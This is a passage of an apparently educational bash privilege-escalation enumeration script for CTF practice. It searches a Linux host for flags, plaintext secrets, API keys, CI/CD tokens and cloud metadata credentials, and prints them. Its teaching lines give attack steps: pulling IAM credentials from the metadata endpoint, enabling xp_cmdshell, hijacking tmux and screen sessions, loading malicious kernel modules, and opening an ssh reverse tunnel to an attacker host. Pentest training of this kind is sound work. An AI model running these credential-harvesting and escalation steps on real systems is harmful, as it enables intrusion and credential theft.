                cat "$flagfile" 2>/dev/null
            else
                info "Use --flags to reveal flag contents"
            fi
        else
            warn "Root flag exists but not readable: $flagfile"
            teach "Get root to read this file"
        fi
    done
    
    # User flags
    find /home -maxdepth 2 -name "user.txt" -o -name "flag.txt" -o -name "local.txt" 2>/dev/null | while read flagfile; do
        if [ -r "$flagfile" ]; then
            ctf_flag "USER FLAG READABLE: $flagfile"
            vuln "USER FLAG FOUND: $flagfile"
            
            if [ $SHOW_FLAGS -eq 1 ]; then
                cat "$flagfile" 2>/dev/null
            else
                info "Use --flags to reveal flag contents"
            fi
        else
            warn "User flag exists but not readable: $flagfile"
            teach "Escalate to user $(stat -c %U "$flagfile" 2>/dev/null) to read this"
        fi
    done
    
    # Other flag locations
    find /var/www /opt -maxdepth 3 -name "*flag*" -o -name "*.txt" 2>/dev/null | while read flagfile; do
        if [ -r "$flagfile" ] && grep -qE "flag{|HTB{|THM{|CTF{|^[a-f0-9]{32}$" "$flagfile" 2>/dev/null; then
            ctf_flag "FLAG FOUND: $flagfile"
            vuln "FLAG FOUND: $flagfile"
            
            if [ $SHOW_FLAGS -eq 1 ]; then
                cat "$flagfile" 2>/dev/null
            else
                info "Use --flags to reveal flag contents"
            fi
        fi
    done
    
    info "Searching for flag patterns in readable files:"
    local pattern_count=0
    local total_patterns=5

    for pattern in "${flag_patterns[@]}"; do
    pattern_count=$((pattern_count + 1))
    echo -ne "\r[INFO] Checking pattern $pattern_count/$total_patterns..." >&2
    
    grep -rE "$pattern" /home /var/www /opt /tmp 2>/dev/null | grep -vE "teachpeas|learnpeas|\.log:|\.sh:" | head -5 | while read match; do
        echo -ne "\r\033[K"  # Clear progress line
        warn "Potential flag: $match"
    done
    done
    echo -ne "\r\033[K"  # Clear final progress line
    
    # Check current directory
    if ls user.txt root.txt flag.txt 2>/dev/null | grep -q .; then
        ctf_flag "FLAG FILE IN CURRENT DIRECTORY!"
        vuln "Flag file in current directory!"
        
        if [ $SHOW_FLAGS -eq 1 ]; then
            cat user.txt root.txt flag.txt 2>/dev/null
        else
            info "Use --flags to reveal flag contents"
        fi
    fi
    
    # Check for encoded flags
    info "Checking for base64-encoded flags:"
    find /home /var/www /opt -type f -readable 2>/dev/null | head -100 | while read file; do
        # Skip binary files
        if file "$file" | grep -q "text"; then
            if [ $(wc -l < "$file" 2>/dev/null) -eq 1 ]; then
               local content=$(cat "$file" 2>/dev/null)
               if echo "$content" | grep -qE "^[A-Za-z0-9+/=]{20,}$"; then
                   local decoded=$(echo "$content" | base64 -d 2>/dev/null)
                   if echo "$decoded" | grep -qE "flag{|HTB{|THM{|^[a-f0-9]{32}$"; then
                        ctf_flag "Base64-encoded flag in $file"
                        vuln "Base64-encoded flag in $file:"
                    
                        if [ $SHOW_FLAGS -eq 1 ]; then
                            echo "$decoded"
                        else
                            info "Use --flags to reveal flag contents"
                        fi
                    fi
                fi
            fi
        fi
    done
    
    # Check environment variables
    if env | grep -iE "flag|htb|thm" | grep -qv "EXTENDED|SHOW_FLAGS"; then
        info "Flag-related environment variables:"
        env | grep -iE "flag|htb|thm" | grep -v "EXTENDED\|SHOW_FLAGS"
    fi
    
    teach "\nCTF-specific hiding places:"
    teach "  • Steganography in images (use steghide, binwalk)"
    teach "  • Hidden in EXIF data (use exiftool)"
    teach "  • Encoded in environment variables"
    teach "  • In database tables"
    teach "  • In git commit history (.git/logs/HEAD)"
    teach "  • Hidden with alternate data streams (NTFS)"
    teach "  • Inside zip/tar archives"
}
# === NETWORK PIVOTING ===
enum_pivoting() {
    [ $EXTENDED -eq 0 ] && return
    
    section "NETWORK PIVOTING SETUP"
    
    explain_concept "Network Pivoting" \
        "Use compromised host as a jump point to access internal networks not directly reachable from your attack machine." \
        "Many networks have an external-facing host (DMZ) and internal hosts. Once you compromise the DMZ host, you can tunnel through it to reach internal services. Essential for multi-host CTF challenges." \
        "Common techniques:\n  • SSH tunneling (local/remote port forwarding)\n  • Chisel (SOCKS proxy over HTTP)\n  • Ligolo-ng (modern tunneling)\n  • Metasploit autoroute"
    
    # Check if we can SSH out
    if command -v ssh >/dev/null 2>&1; then
        info "SSH client available for tunneling"
        teach "SSH tunneling options:"
        teach "  Local forward: ssh -L 8080:internal_host:80 user@pivot"
        teach "  Remote forward: ssh -R 9001:localhost:443 attacker@YOUR_IP"
        teach "  Dynamic (SOCKS): ssh -D 1080 user@pivot"
    fi
    
    # Check for internal networks
    ip addr 2>/dev/null | grep -oE "inet ([0-9]{1,3}\.){3}[0-9]{1,3}" | awk '{print $2}' | while read ip; do
        local network=$(echo $ip | cut -d. -f1-3)
        
        case $network in
            192.168.*|172.16.*|172.17.*|172.18.*|172.19.*|172.20.*|172.21.*|172.22.*|172.23.*|172.24.*|172.25.*|172.26.*|172.27.*|172.28.*|172.29.*|172.30.*|172.31.*|10.*)
                info "Internal network detected: $network.0/24"
                teach "Scan this network from the compromised host:"
                teach "  for i in {1..254}; do ping -c 1 $network.\$i &>/dev/null && echo \$network.\$i; done"
                ;;
        esac
    done
    
    # Check for proxychains config
    if [ -f /etc/proxychains.conf ] || [ -f ~/.proxychains/proxychains.conf ]; then
        info "Proxychains is configured"
        teach "Use proxychains to route tools through this host"
    fi
}

# ═══════════════════════════════════════════════════
# PHASE 1: HIGH-VALUE ADDITIONS
# ═══════════════════════════════════════════════════

# === CLOUD METADATA SERVICES ===
enum_cloud_metadata() {
    section "CLOUD METADATA SERVICE ENUMERATION"
    
    explain_concept "Cloud Instance Metadata" \
        "Cloud providers expose instance metadata via HTTP endpoint. Contains credentials, SSH keys, user-data scripts." \
        "Cloud instances need to query their own metadata for configuration. AWS uses 169.254.169.254, Azure uses similar. If you're on a cloud instance, this endpoint contains IAM credentials, API keys, bootstrap scripts with passwords." \
        "Access:\n  AWS: curl http://169.254.169.254/latest/meta-data/\n  Azure: curl -H 'Metadata:true' http://169.254.169.254/metadata/instance?api-version=2021-02-01\n  GCP: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/"
    
    # Check if we can reach cloud metadata
    if command -v curl >/dev/null 2>&1; then
        # AWS Check
        if timeout 2 curl -s -f http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1; then
            critical "AWS METADATA ACCESSIBLE - Steal IAM credentials for cloud access"
            vuln "AWS EC2 Metadata Service is ACCESSIBLE!"
            info "Instance metadata available at: http://169.254.169.254/latest/meta-data/"
            
            teach "AWS Metadata exploitation:"
            teach "  1. Get IAM role: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            teach "  2. Get credentials: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
            teach "  3. Get user-data (bootstrap script): curl http://169.254.169.254/latest/user-data"
            teach "  4. Use credentials with AWS CLI for lateral movement"
            
            # Try to get actual creds
            local role=$(timeout 2 curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
            if [ -n "$role" ]; then
                critical "IAM Role found: $role - Extract credentials immediately"
                vuln "IAM Role found: $role"
                teach "Retrieve credentials: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$role"
            fi
        fi
        
        # Azure Check
        if timeout 2 curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | grep -q "compute"; then
            critical "Azure metadata accessible - Extract managed identity tokens"
            vuln "Azure Instance Metadata Service is ACCESSIBLE!"
            teach "Azure Metadata exploitation:"
            teach "  curl -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"
            teach "  May contain managed identity tokens"
        fi
        
        # GCP Check
        if timeout 2 curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" 2>/dev/null | grep -q "."; then
            critical "GCP metadata accessible - Extract service account tokens"
            vuln "GCP Metadata Service is ACCESSIBLE!"
            teach "GCP Metadata exploitation:"
            teach "  curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/"
            teach "  Get service account token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        fi
    else
        info "curl not available - cannot check cloud metadata"
    fi
}

# === LANGUAGE-SPECIFIC CREDENTIAL HUNTING ===
enum_language_creds() {
    section "LANGUAGE-SPECIFIC CREDENTIAL DISCOVERY"
    
    explain_concept "Framework Credentials" \
        "Modern web frameworks store credentials in .env files, config files, or package managers. These are often readable and contain database passwords, API keys, secret keys." \
        "Developers use environment variables for configuration (12-factor app methodology). .env files, package.json, composer.json, Gemfiles all can contain secrets. Left readable by accident or misconfiguration." \
        "Common locations:\n  • .env (all frameworks)\n  • package.json (Node.js)\n  • composer.json (PHP)\n  • requirements.txt (Python)\n  • Gemfile (Ruby)\n  • appsettings.json (ASP.NET)"
    
    # .env files (used by Laravel, Node.js, Rails, etc)
    info "Searching for .env files..."
    find / -name ".env" -type f -readable 2>/dev/null | head -20 | while read envfile; do
        vuln "Found .env file: $envfile"
        if grep -iE "password|secret|key|token|api" "$envfile" 2>/dev/null | head -5 | grep -q "."; then
            critical ".env file with credentials: $envfile"
            warn "Contains credentials:"
            grep -iE "password|secret|key|token|api" "$envfile" 2>/dev/null | head -5 | while read line; do
                log "  $line"
            done
        fi
    done
    
    # Node.js package.json
    info "Checking Node.js package.json files..."
    find / -name "package.json" -type f -readable 2>/dev/null | head -10 | while read pkgfile; do
        if grep -qE "password|token|secret" "$pkgfile" 2>/dev/null; then
            warn "package.json with secrets: $pkgfile"
            grep -E "password|token|secret" "$pkgfile" 2>/dev/null | head -3
        fi
        
        # Check for node_modules with known vulnerabilities
        local dir=$(dirname "$pkgfile")
        if [ -d "$dir/node_modules" ]; then
            info "Node modules at: $dir/node_modules"
            teach "Run 'npm audit' here to check for vulnerable packages"
        fi
    done
    
    # Python virtual environments
    info "Checking Python virtual environments..."
    find / -name "pyvenv.cfg" -o -name "activate" -type f 2>/dev/null | head -10 | while read venv; do
        local venvdir=$(dirname "$venv")
        info "Python venv: $venvdir"
        
        # Check for credentials in activate script
        if [ -f "$venvdir/activate" ]; then
            if grep -qE "PASSWORD|SECRET|TOKEN" "$venvdir/activate" 2>/dev/null; then
                warn "Credentials in activate script: $venvdir/activate"
            fi
        fi
    done
    
    # PHP composer.json
    info "Checking PHP composer.json files..."
    find / -name "composer.json" -type f -readable 2>/dev/null | head -10 | while read composer; do
        if grep -qE "password|token|auth" "$composer" 2>/dev/null; then
            warn "composer.json with secrets: $composer"
            grep -E "password|token|auth" "$composer" 2>/dev/null | head -3
        fi
    done
    
    # Ruby Gemfile
    info "Checking Ruby Gemfile files..."
    find / -name "Gemfile" -type f -readable 2>/dev/null | head -10 | while read gemfile; do
        info "Found Gemfile: $gemfile"
        if grep -qE "password|token" "$gemfile" 2>/dev/null; then
            warn "Gemfile contains credentials"
        fi
    done
    
    # ASP.NET configuration
    find / -name "appsettings.json" -o -name "web.config" -type f -readable 2>/dev/null | head -10 | while read config; do
        warn "Found ASP.NET config: $config"
        if grep -iE "connectionstring|password|secret" "$config" 2>/dev/null | head -3 | grep -q "."; then
            vuln "Config contains credentials!"
            grep -iE "connectionstring|password|secret" "$config" 2>/dev/null | head -3
        fi
    done
}
# ============================================
# API Keys and Token Search
# ============================================
enum_api_keys() {
    section "API KEYS & TOKEN DISCOVERY"
    
    explain_concept "API Key Exposure" \
        "Modern applications use API keys and tokens for authentication. These are often hardcoded in files, environment variables, or configuration." \
        "Developers hardcode credentials for testing and forget to remove them. CI/CD systems store secrets in config files. API keys provide direct access to cloud resources, databases, payment systems, and third-party services. One leaked AWS key can compromise entire infrastructure." \
        "Common patterns:\n  • AWS: AKIA[0-9A-Z]{16}\n  • GitHub: ghp_, gho_, ghs_\n  • Slack: xox[baprs]-\n  • Google API: AIza[0-9A-Za-z\\-_]{35}\n  • Stripe: sk_live_, pk_live_"
    
    info "Searching for API keys and tokens in common locations (this can take several minutes)..."
    warn "Press ENTER to skip this check and continue to next enumeration."
    
    # Define regex patterns
    local aws_pattern='AKIA[0-9A-Z]{16}'
    local github_pattern='gh[ps]_[0-9a-zA-Z]{36}'
    local slack_pattern='xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,32}'
    local google_pattern='AIza[0-9A-Za-z\-_]{35}'
    local stripe_pattern='[sr]k_live_[0-9a-zA-Z]{24,}'
    local jwt_pattern='eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
    
    # Exclusion pattern for binary files, caches, and false positive locations
    local exclude_patterns="teachpeas|learnpeas|linpeas|\.git|node_modules|\.cache|IndexedDB|\.sqlite|\.db|\.bin|[Cc]ache|\.ico|\.woff|\.ttf|\.eot|\.svg|Extensions|/etc/chromium"
    
    # Search in common locations
    local search_paths=("/home" "/var/www" "/opt" "/etc" "/tmp")
    local total_paths=${#search_paths[@]}
    local current=0
    local skip_api_keys=false
    
    # Function to check if user pressed Enter
    check_skip() {
        if read -t 0.01; then
            skip_api_keys=true
            echo -ne "\r\033[K" >&2
            info "Skipping API key enumeration..."
            return 1
        fi
        return 0
    }
    
    for path in "${search_paths[@]}"; do
        [ ! -d "$path" ] && continue
        check_skip || break
        
        current=$((current + 1))
        
        echo -ne "\r[INFO] Searching $path... ($current/$total_paths) - Press ENTER to skip" >&2
        
        # AWS Keys - added -I to skip binary files
        check_skip || break
        local aws_results=$(grep -rInE "$aws_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -3)
        if [ -n "$aws_results" ]; then
            echo -ne "\r\033[K" >&2  # Clear progress line
            critical "AWS ACCESS KEY FOUND in $path - Full cloud access possible"
            vuln "AWS access key detected"
            echo "$aws_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # GitHub Tokens - added -I to skip binary files
        check_skip || break
        local github_results=$(grep -rInE "$github_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -3)
        if [ -n "$github_results" ]; then
            echo -ne "\r\033[K" >&2
            critical "GITHUB TOKEN FOUND in $path - Repository access possible"
            vuln "GitHub token detected"
            echo "$github_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # Slack Tokens - added -I to skip binary files
        check_skip || break
        local slack_results=$(grep -rInE "$slack_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2)
        if [ -n "$slack_results" ]; then
            echo -ne "\r\033[K" >&2
            warn "Slack token detected in: $path"
            echo "$slack_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # Google API Keys - added -I to skip binary files
        check_skip || break
        local google_results=$(grep -rInE "$google_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2)
        if [ -n "$google_results" ]; then
            echo -ne "\r\033[K" >&2
            warn "Google API key detected in: $path"
            echo "$google_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # Stripe Keys - added -I to skip binary files
        check_skip || break
        local stripe_results=$(grep -rInE "$stripe_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2)
        if [ -n "$stripe_results" ]; then
            echo -ne "\r\033[K" >&2
            critical "STRIPE API KEY FOUND in $path - Payment system access"
            vuln "Stripe key detected"
            echo "$stripe_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # JWT Tokens - added -I to skip binary files
        check_skip || break
        if grep -rIE "$jwt_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2 | grep -q "."; then
            echo -ne "\r\033[K" >&2
            warn "JWT token detected in: $path"
            teach "JWT tokens can be decoded at jwt.io to extract user information"
        fi
    done
    
    echo -ne "\r\033[K" >&2  # Clear final progress line
    
    # Check environment variables (only if not skipped)
    if ! $skip_api_keys; then
        info "Checking environment variables for secrets..."
        if env | grep -iE "api_key|api_secret|access_key|secret_key|password|token" | grep -qv "teachpeas"; then
            warn "Potential secrets in environment variables:"
            env | grep -iE "api_key|api_secret|access_key|secret_key|password|token" | grep -v "teachpeas" | head -5 | while read line; do
                log "  $line"
            done
        fi
        
        teach "\nAPI Key Exploitation:"
        teach "  • AWS keys: Use aws-cli to enumerate and pivot"
        teach "  • GitHub tokens: Clone private repos, read secrets"
        teach "  • Slack tokens: Read messages, exfiltrate data"
        teach "  • Stripe keys: Access payment/customer data"
    fi
    
    # Clear any remaining input
    read -t 0.01 -n 10000 discard 2>/dev/null || true
}

# === ENHANCED DATABASE CHECKS ===
enum_databases_extended() {
    section "ENHANCED DATABASE ENUMERATION"
    
    explain_concept "Database Privilege Escalation - Extended" \
        "Databases with weak configs or accessible sockets can lead to command execution or file access." \
        "Beyond default credentials, check for: UDF exploits, file read/write permissions, command execution features, socket permissions." \
        "MSSQL: xp_cmdshell for command execution\nMySQL: UDF for code execution\nPostgreSQL: COPY TO PROGRAM\nMongoDB: NoSQL injection in apps"
    
    # Enhanced MySQL checks
    if command -v mysql >/dev/null 2>&1; then
        info "Enhanced MySQL enumeration..."
        
        # Check for mysql config files with credentials
        for conf in /etc/mysql/my.cnf ~/.my.cnf /etc/my.cnf; do
            if [ -r "$conf" ]; then
                info "Found MySQL config: $conf"
                if grep -qE "password|user" "$conf" 2>/dev/null; then
                    warn "Config contains credentials:"
                    grep -E "password|user" "$conf" 2>/dev/null | grep -v "^#"
                fi
            fi
        done
        
        # Check for .mysql_history
        find /root /home -name ".mysql_history" -readable 2>/dev/null | while read hist; do
            warn "MySQL history file: $hist"
            teach "May contain passwords in CREATE USER or GRANT statements"
            if grep -iE "password|identified by" "$hist" 2>/dev/null | head -3 | grep -q "."; then
                vuln "History contains passwords!"
            fi
        done
    fi
    
    # MSSQL checks
    if command -v sqlcmd >/dev/null 2>&1; then
        info "MSSQL client (sqlcmd) is available"
        teach "MSSQL exploitation if accessible:"
        teach "  1. Enable xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        teach "  2. Execute commands: EXEC xp_cmdshell 'whoami';"
        teach "  3. Common default creds: sa/sa, sa/password"
    fi
    
    # MongoDB enhanced
    if command -v mongo >/dev/null 2>&1 || command -v mongosh >/dev/null 2>&1; then
        local mongo_cmd=$(command -v mongosh 2>/dev/null || command -v mongo 2>/dev/null)
        
        # Check if accessible without auth
        if timeout 3 $mongo_cmd --eval "db.version()" 2>/dev/null | grep -q "MongoDB"; then
            critical "MongoDB unauthenticated - Dump all databases"
            vuln "MongoDB is accessible WITHOUT authentication!"
            
            teach "MongoDB exploitation:"
            teach "  1. List databases: show dbs"
            teach "  2. Select DB: use <database>"
            teach "  3. Dump collections: db.<collection>.find()"
            teach "  4. Look for users, credentials, API keys"
            
            # Try to enumerate databases
            local dbs=$(timeout 3 $mongo_cmd --quiet --eval "db.adminCommand('listDatabases')" 2>/dev/null)
            if [ -n "$dbs" ]; then
                info "MongoDB databases found:"
                echo "$dbs" | grep -oE '"name" : "[^"]*"' | cut -d'"' -f4 | while read db; do
                    log "  - $db"
                done
            fi
        fi
    fi
    
    # Check for database dump files (exclude phpmyadmin system files)
    info "Searching for database dump files..."
    find / -name "*.sql" -o -name "*.dump" -o -name "*.bak" 2>/dev/null | \
    grep -iE "backup|dump|sql" | \
    grep -vE "phpmyadmin|dbconfig-common|/usr/share/doc" | \
    head -10 | while read dump; do
        if [ -r "$dump" ]; then
            warn "Database dump file: $dump"
            teach "May contain credentials in CREATE USER, INSERT, or comments"
        fi
    done
}

# === CI/CD PIPELINE EXPOSURE ===
enum_cicd() {
    section "CI/CD PIPELINE & SECRET EXPOSURE"
    
    explain_concept "CI/CD Secrets" \
        "CI/CD systems store credentials for deployments. Config files, environment variables, and cached credentials can be exposed." \
        "Jenkins, GitLab CI, GitHub Actions all need credentials to deploy. These are stored in config files, environment variables, or .git/config. Often readable by web server or application user." \
        "Check:\n  • .git/config (remote URLs with tokens)\n  • .gitlab-ci.yml (secret variables)\n  • Jenkinsfile (credentials)\n  • .github/workflows/*.yml"
    
    # Git configuration with tokens
    info "Checking .git/config for embedded tokens..."
    find / -name ".git" -type d 2>/dev/null | head -20 | while read gitdir; do
        if [ -r "$gitdir/config" ]; then
            if grep -E "https://.*:.*@|token" "$gitdir/config" 2>/dev/null | grep -q "."; then
                critical "Git credentials in config: $gitdir/config"
                vuln "Git config with credentials: $gitdir/config"
                grep -E "https://.*:.*@|token" "$gitdir/config" 2>/dev/null | while read line; do
                    log "  $line"
                done
                teach "Extract token and use for repository access or API calls"
            fi
        fi
        
        # Check git logs for secrets
        if [ -d "$gitdir" ]; then
            local gitroot=$(dirname "$gitdir")
            cd "$gitroot" 2>/dev/null && {
                if git log -p 2>/dev/null | grep -iE "password|secret|key" | head -5 | grep -q "."; then
                    warn "Git history contains potential secrets in: $gitroot"
                    teach "Review with: git log -p | grep -i password"
                fi
            }
        fi
    done
    
    # GitLab CI configuration
    find / -name ".gitlab-ci.yml" -type f -readable 2>/dev/null | head -10 | while read gitlab; do
        warn "GitLab CI config: $gitlab"
        if grep -iE "password|secret|token|key" "$gitlab" 2>/dev/null | grep -v "\\$" | head -3 | grep -q "."; then
            critical "Hardcoded secrets in GitLab CI: $gitlab"
            vuln "Hardcoded secrets in GitLab CI!"
            grep -iE "password|secret|token|key" "$gitlab" 2>/dev/null | grep -v "\\$" | head -3
        fi
        teach "Even if using variables, check GitLab runner cache for exposed secrets"
    done
    
    # GitHub Actions
    find / -name ".github" -type d 2>/dev/null | head -10 | while read ghdir; do
        if [ -d "$ghdir/workflows" ]; then
            info "GitHub Actions workflows: $ghdir/workflows"
            find "$ghdir/workflows" -name "*.yml" -o -name "*.yaml" | while read workflow; do
                if grep -iE "password|secret|token" "$workflow" 2>/dev/null | grep -v "secrets\\." | grep -q "."; then
                    warn "Potential hardcoded secret in: $workflow"
                fi
            done
        fi
    done
    
    # Jenkins
    if [ -d /var/lib/jenkins ] || [ -d /var/jenkins_home ]; then
        warn "Jenkins directory detected"
        teach "Jenkins exploitation:"
        teach "  • credentials.xml contains encrypted credentials"
        teach "  • secrets/ directory has master key"
        teach "  • jobs/*/config.xml may have plaintext tokens"
        teach "  • If you can access Jenkins web, use Script Console for RCE"
        
        # Check for readable Jenkins credentials
        find /var/lib/jenkins /var/jenkins_home -name "credentials.xml" -readable 2>/dev/null | while read creds; do
            critical "Readable Jenkins credentials: $creds"
            vuln "Readable Jenkins credentials: $creds"
        done
    fi
    
    # Docker registry credentials
    for dockerconf in ~/.docker/config.json /root/.docker/config.json; do
        if [ -r "$dockerconf" ]; then
            vuln "Docker config with registry credentials: $dockerconf"
            teach "Contains auth tokens for Docker registries"
            teach "Decode with: cat $dockerconf | jq -r '.auths[].auth' | base64 -d"
        fi
    done
}

# ═══════════════════════════════════════════════════
# END PHASE 1 ADDITIONS
# ═══════════════════════════════════════════════════

# === PROCESS MONITORING ===
enum_processes() {
    section "RUNNING PROCESSES ANALYSIS"
    
    explain_concept "Process Monitoring" \
        "Other users' processes may contain credentials in command line arguments or environment variables." \
        "Many admins run scripts with hardcoded passwords visible in 'ps aux'. Cron jobs pass credentials as arguments. Services load API keys from environment." \
        "Monitor with: watch -n 1 'ps aux'\nLook for: mysql -p, curl -u, ssh user@host, API tokens"
    
    info "Current processes (checking for credentials in command line):"
    ps aux | grep -iE "password=|passwd=|-p |--password|token=|key=|secret=|api=" | grep -v "grep" | head -10 | while read line; do
        warn "Potentially sensitive process:"
        log "  $line"
        log ""  # Add blank line between each process      
    done
    # Check for tmux/screen sessions
    if command -v tmux >/dev/null 2>&1; then
        local sessions=$(tmux ls 2>/dev/null | wc -l)
        if [ $sessions -gt 0 ]; then
            critical "Active tmux sessions - Attach to steal active shells"
            vuln "Active tmux sessions found!"
            teach "Try attaching: tmux attach -t <session>"
            teach "May get access to other user's shell"
            tmux ls 2>/dev/null
        fi
    fi
    
    if command -v screen >/dev/null 2>&1; then
        screen -ls 2>/dev/null | grep -q Detached && {
            critical "Detached screen sessions - Attach to hijack shells"
            vuln "Detached screen sessions found!"
            teach "Try attaching: screen -r"
            screen -ls 2>/dev/null
        }
    fi
}

# === MAIL & LOGS ===
enum_mail_logs() {
    section "MAIL SPOOL & LOG ANALYSIS"
    
    explain_concept "Mail & Logs" \
        "Mail spools often contain credentials, password reset tokens, or sensitive information. Logs may reveal user behavior and secrets." \
        "Users receive system notifications via mail. Password resets, admin messages, application errors all go to mail. Logs capture authentication attempts, application errors with credentials." \
        "Check:\n  /var/mail/*\n  /var/spool/mail/*\n  ~/.mail\n  /var/log/auth.log (failed SSH attempts)\n  Application logs"
    
    # Check mail spools
    for maildir in /var/mail /var/spool/mail; do
        if [ -d "$maildir" ]; then
            find "$maildir" -type f -readable 2>/dev/null | while read mail; do
                vuln "Readable mail spool: $mail"
                teach "Read with: cat $mail | less"
                if grep -iE "password|token|reset" "$mail" 2>/dev/null | head -3 | grep -q "."; then
                    critical "Mail contains passwords/tokens: $mail"
                    warn "Mail contains password-related content!"
                fi
            done
        fi
    done
    
    # Check home directory mail
    find /home \( -path "*/containers/storage/*" \) -prune -o \( -name ".mail" -o -name "mail" -o -name "mbox" \) -print 2>/dev/null | while read mail; do
        [ -r "$mail" ] && info "Found mail file: $mail"
    done
    
    # Check auth logs for interesting info
    if [ -r /var/log/auth.log ]; then
        info "Checking auth.log for failed authentication attempts..."
        grep "Failed password" /var/log/auth.log 2>/dev/null | tail -5 | while read line; do
            log "  $line"
        done
        teach "Failed attempts reveal valid usernames"
    fi
}

# === BACKUP FILES ===
enum_backups() {
    section "BACKUP FILE DISCOVERY"
    
    explain_concept "Backup Files" \
        "Backup files often contain old configurations with credentials or reveal file structure." \
        "Admins create backups before changes. These backups may have weaker permissions or old credentials that still work. Common patterns: .bak, .old, .backup, ~, .swp, .save" \
        "Where to look:\n  /var/backups\n  /tmp/*.bak\n  /opt/*.old\n  Web roots with .bak files"
    
    info "Searching for backup files..."
    
    # System backups
    if [ -d /var/backups ]; then
        find /var/backups -type f -readable 2>/dev/null | head -10 | while read backup; do
            info "System backup: $backup"
            if echo "$backup" | grep -qE "passwd|shadow|group"; then
                critical "Authentication file backup: $backup"
                vuln "Authentication file backup found: $backup"
            fi
        done
    fi
    
    # Application backups
    for pattern in "*.bak" "*.backup" "*.old" "*~"; do
        find /var/www /opt /home -name "$pattern" -type f -readable 2>/dev/null | head -10 | while read backup; do
            warn "Backup file: $backup"
            
            # Check if it's a database dump
            if echo "$backup" | grep -qE "\.sql|dump"; then
                vuln "Database backup found: $backup"
                teach "May contain credentials in CREATE USER or INSERT statements"
            fi
        done
    done
    
    # Vim swap files (may contain unsaved work)
    find /root /home -name ".*.swp" -o -name ".*.swo" 2>/dev/null | while read swap; do
        [ -r "$swap" ] && warn "Vim swap file: $swap (may contain unsaved edits)"
    done
}

# === KERNEL MODULES ===
enum_kernel_modules() {
    section "LOADED KERNEL MODULES"
    
    explain_concept "Kernel Modules" \
        "Custom or vulnerable kernel modules can be exploited for privilege escalation." \
        "Modules extend kernel functionality. Custom modules may have vulnerabilities. Some modules (like vboxdrv) have known privilege escalation paths." \
        "Check lsmod output for unusual modules, then search for module_name + CVE"
    
    info "Loaded kernel modules:"
    lsmod | head -15
    
    # Check for interesting modules
    if lsmod | grep -qE "vboxdrv|vmware"; then
        warn "Virtualization modules detected"
        teach "Check for VM escape vulnerabilities"
    fi
    
    # Check for writable module directory
    if [ -w /lib/modules/$(uname -r) ]; then
        critical "Kernel module directory WRITABLE - Load malicious modules"
        vuln "Kernel module directory is WRITABLE!"
        teach "You can load malicious kernel modules"
        teach "  Create malicious .ko file and: insmod malicious.ko"
    fi
}

# === APPARMOR / SELINUX ===
enum_mac() {
    section "MANDATORY ACCESS CONTROL (MAC)"
    
    explain_concept "AppArmor & SELinux" \
        "MAC systems add another layer of access control beyond standard Unix permissions." \
        "Even if you have root, MAC can prevent certain actions. However, if MAC is disabled or in permissive mode, it's not protecting anything." \
        "Check status and consider if it's blocking your exploitation attempts"
        # Check AppArmor
    if command -v aa-status >/dev/null 2>&1; then
        local aa_status=$(aa-status 2>/dev/null | grep "apparmor module is loaded" )
        if [ -n "$aa_status" ]; then
            warn "AppArmor is active"
            teach "May restrict exploitation of certain binaries"
            teach "Check confined processes: aa-status"
        else
            ok "AppArmor is not active"
        fi
    fi
    
    # Check SELinux
    if command -v getenforce >/dev/null 2>&1; then
        local se_status=$(getenforce 2>/dev/null)
        case "$se_status" in
            Enforcing)
                warn "SELinux is in Enforcing mode"
                teach "Will block many exploitation attempts"
                ;;
            Permissive)
                info "SELinux is in Permissive mode (logs but doesn't block)"
                ;;
            Disabled)
                ok "SELinux is disabled"
                ;;
        esac
    fi
}

# === MOUNTED FILESYSTEMS ===
enum_mounts() {
    section "MOUNTED FILESYSTEMS"
    
    explain_concept "Mount Points" \
        "Unusual mounts may reveal NFS shares, sensitive directories, or container volumes." \
        "Network mounts (NFS, CIFS) may be writable from network. Bind mounts can expose sensitive directories. Docker volumes may contain application data." \
        "Look for: NFS mounts, /dev/sd* mounts in unusual places, tmpfs in weird locations"
    
    info "Current mounts:"
    mount | grep -vE "^(proc|sys|cgroup|devpts|tmpfs on /(dev|run|sys))" | while read line; do
        log "  $line"
        
        # Check for NFS
        if echo "$line" | grep -q "type nfs"; then
            warn "NFS mount detected: $line"
            teach "Check if writable and accessible from your attack machine"
        fi
        
        # Check for unusual tmpfs
        if echo "$line" | grep -q "tmpfs on /mnt\|tmpfs on /opt"; then
            warn "Unusual tmpfs mount: $line"
        fi
    done
    
    # Check /etc/fstab for auto-mounts
    if [ -r /etc/fstab ]; then
        info "Checking /etc/fstab for interesting mounts..."
        grep -vE "^#|^$" /etc/fstab | grep -E "nfs|cifs|smb" | while read line; do
